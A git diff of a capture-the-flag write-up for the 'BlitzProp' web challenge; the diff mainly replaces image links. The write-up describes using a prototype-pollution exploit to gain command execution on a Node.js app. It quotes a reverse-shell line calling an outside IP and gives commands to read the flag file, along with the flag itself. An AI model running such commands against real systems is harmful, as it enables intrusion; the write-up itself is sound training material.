@@ -72,35 +72,33 @@ To begin with I opened the website just to get a visual idea of what I've got to
 
 <img src="{{site.url}}/resources/images/BlitzProp/IndexPage.png" style="display: block; margin: auto;" />
 
-![image](https://user-images.githubusercontent.com/21271178/115796185-4a958900-a3c9-11eb-89c4-a0066ad92dce.png)
-
 The page is pretty basic. There is one area to input text along with a "Submit" button.
 
 There are four song titles we can enter. Entering one of these causes the text at the bottom to show `Hello guest, thank you for letting us know!`
 
-![image](https://user-images.githubusercontent.com/21271178/115796431-b841b500-a3c9-11eb-8097-b7f3bf3c3a2e.png)
+<img src="{{site.url}}/resources/images/BlitzProp/IndexPageValidInput.png" style="display: block; margin: auto;" />
 
 Inputting invalid text results in the text at the bottom showing `Please provide us with the name of an existing song`
 
-![image](https://user-images.githubusercontent.com/21271178/115796369-aeb84d00-a3c9-11eb-9496-3affdf89c4f2.png)
+<img src="{{site.url}}/resources/images/BlitzProp/PageInvalidInput.png" style="display: block; margin: auto;" />
 
 Ok, so at this point it's time to take a look at the source code. My first step is usually to `tree` the source folder to get an overview of what we have to work with:
 
-![image](https://user-images.githubusercontent.com/21271178/115796575-f8089c80-a3c9-11eb-8060-4d74c40d68a8.png)
+<img src="{{site.url}}/resources/images/BlitzProp/SourceFiles.png" style="display: block; margin: auto;" />
 
 Lets look at the `entrypoint.sh` file to try to gather some information about how the docker instance is created:
 
-![image](https://user-images.githubusercontent.com/21271178/115796774-52a1f880-a3ca-11eb-8077-b552690ed381.png)
+<img src="{{site.url}}/resources/images/BlitzProp/entrypoint.png" style="display: block; margin: auto;" />
 
 From this we can see that the flag for this challenge lives under `/app/flag` with some random alphanumeric characters at the end. Good to know.
 
 Next, lets look at the `Dockerfile`. This reveals that the site is running a node-js application.
 
-![image](https://user-images.githubusercontent.com/21271178/115796967-b4faf900-a3ca-11eb-8bfc-bdaeb4d31e2c.png)
+<img src="{{site.url}}/resources/images/BlitzProp/Dockerfile.png" style="display: block; margin: auto;" />
 
 Next, lets look at the `index.js` file
 
-![image](https://user-images.githubusercontent.com/21271178/115797162-289d0600-a3cb-11eb-81c9-aaf6a437b47e.png)
+<img src="{{site.url}}/resources/images/BlitzProp/IndexSource.png" style="display: block; margin: auto;" />
 
 From this we can gather that when the submit button is pressed, a `POST` call is made to the `/api/submit` endpoint. 
 
@@ -124,11 +122,11 @@ The author provides a python script which sends a `POST` request to a vulnerable
 I wasn't 100% sure if this exploit would work against the endpoint, but it only takes a minute to try it out so I figured it was worth a shot! 
 
 So, after running the script against the endpoint, I entered a valid song and pressed 'Submit'. This time, I get a status 500 Response
-![image](https://user-images.githubusercontent.com/21271178/115799865-44a3a600-a3d1-11eb-9768-f49f66fe6d2d.png)
+<img src="{{site.url}}/resources/images/BlitzProp/Status_500.png" style="display: block; margin: auto;" />
 
 But what's really interesting is what we get back as the response!
 
-![image](https://user-images.githubusercontent.com/21271178/115799996-8df3f580-a3d1-11eb-9a5f-17482e300765.png)
+<img src="{{site.url}}/resources/images/BlitzProp/Status_500_response.png" style="display: block; margin: auto;" />
 
 ```
 Error: Command failed: bash -c 'bash -i >& /dev/tcp/10.10.14.205/3333 0>&1'
@@ -148,7 +146,7 @@ Error: Command failed: bash -c 'bash -i >& /dev/tcp/10.10.14.205/3333 0>&1'
 
 So at this point I know that I've got RCE on this target! Now, what happens if I change the script so that `execSync` runs `ls /app/flag*`?
 
-![image](https://user-images.githubusercontent.com/21271178/115800253-25f1df00-a3d2-11eb-8334-389d4edf58de.png)
+<img src="{{site.url}}/resources/images/BlitzProp/ls-command-ndefine-response.png" style="display: block; margin: auto;" />
 
 We get back a 200 response with `Hello guestndefine, thank you for letting us know!`
 
@@ -164,8 +162,7 @@ After some thought I realised that, while we are restricted by the fact that we 
 
 This can be done really easily in bash. If we modify the command so that it is `ls /app/flag* 1>&2 && exit 1` then we can redirect the output of `ls /app/flag*` to STDERR (achieved by the `1>&2` part) and have the command return an exit code of 1 (achieved by the `exit 1` part). This should now mean that the `execSync` call will interpret the command as failing, and the `checkExecSyncError` error handling should return the STDERR output to us!
 
-![image](https://user-images.githubusercontent.com/21271178/115800759-2d65b800-a3d3-11eb-91a6-a5c33bd1f330.png)
-
+<img src="{{site.url}}/resources/images/BlitzProp/ls-command-output-response.png" style="display: block; margin: auto;" />
 
 Perfect! While going back through this challenge for this write-up, I used `ls /app*` instead of `ls /app/flag*` by mistake, so here is the truncated output:
 ```
@@ -193,7 +190,7 @@ index.html
 
 Well, now we have the file for the flag: `/app/flagz8aiD` . All we have to do is get its contents! We can do that easily using `cat /app/flagz8aiD 1>&2 && exit 1`
 
-![image](https://user-images.githubusercontent.com/21271178/115801001-a2d18880-a3d3-11eb-8f1f-0587f945d104.png)
+<img src="{{site.url}}/resources/images/BlitzProp/cat-with-flag-output.png" style="display: block; margin: auto;" />
 
 And there we have it, the flag is `CHTB{p0llute_with_styl3}`
 
